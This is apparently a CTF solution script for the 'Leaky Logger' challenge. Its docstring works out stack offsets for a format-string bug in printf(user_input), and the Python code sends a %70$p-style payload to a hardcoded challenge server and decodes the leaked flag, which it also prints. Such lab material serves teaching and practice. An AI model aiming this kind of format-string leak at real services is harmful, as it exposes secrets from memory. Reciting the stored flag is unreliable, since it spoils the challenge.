#!/usr/bin/env python3
"""
RSTCON CTF - Leaky Logger Solution
Challenge: Leaky Logger (Pwn/Rev, 10 pts)
Author: f8al
Vulnerability: Format String vulnerability in printf(user_input)

The binary reads 'flag.txt' into a stack buffer at [rbp - 0x60] at startup.
Then it takes user input into a stack buffer at [rbp - 0x260] via fgets(),
and directly prints it using printf(user_input).

Stack Offset Calculation:
- user_input = [rbp - 0x260] = [rsp] at printf call
- flag buffer = [rbp - 0x60]
- Distance = 0x260 - 0x60 = 0x200 (512 bytes = 64 QWORDs)
- Register args for printf: rsi (%1$), rdx (%2$), rcx (%3$), r8 (%4$), r9 (%5$)
- First stack slot [rsp]: %6$
- Flag starts at: 6 + 64 = slot 70 (%70$p)

Flag spans slots 70 to 74:
- %70$p: 0x667b6e6f63747372 -> 'rstcon{f'
- %71$p: 0x74735f74616d7230 -> '0rmat_st'
- %72$p: 0x336c5f73676e3172 -> 'r1ngs_l3'
- %73$p: 0x735f6568745f6b61 -> 'ak_the_s'
- %74$p: 0x7d6b636174       -> 'tack}\x00'
"""

import socket
import sys

def get_flag(host='18.215.143.250', port=9002):
    payload = "%70$p %71$p %72$p %73$p %74$p\n"
    print(f"Connecting to {host}:{port}...")
    s = socket.create_connection((host, port), timeout=10)
    banner = s.recv(1024)
    s.sendall(payload.encode('ascii'))
    
    response = b""
    while b"\n" not in response or b"logged:" not in response:
        chunk = s.recv(1024)
        if not chunk:
            break
        response += chunk
    s.close()
    
    text = response.decode('utf-8', errors='replace').strip()
    print("Received:", text)
    
    # Extract tokens following 'logged:'
    tokens = text.split("logged:")[-1].strip().split()
    flag_bytes = bytearray()
    for t in tokens:
        val = int(t, 16)
        flag_bytes.extend(val.to_bytes(8, 'little'))
        
    flag = flag_bytes.rstrip(b"\x00").decode('ascii', errors='replace')
    print(f"\n[+] Flag: {flag}")
    return flag

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '18.215.143.250'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9002
    get_flag(host, port)
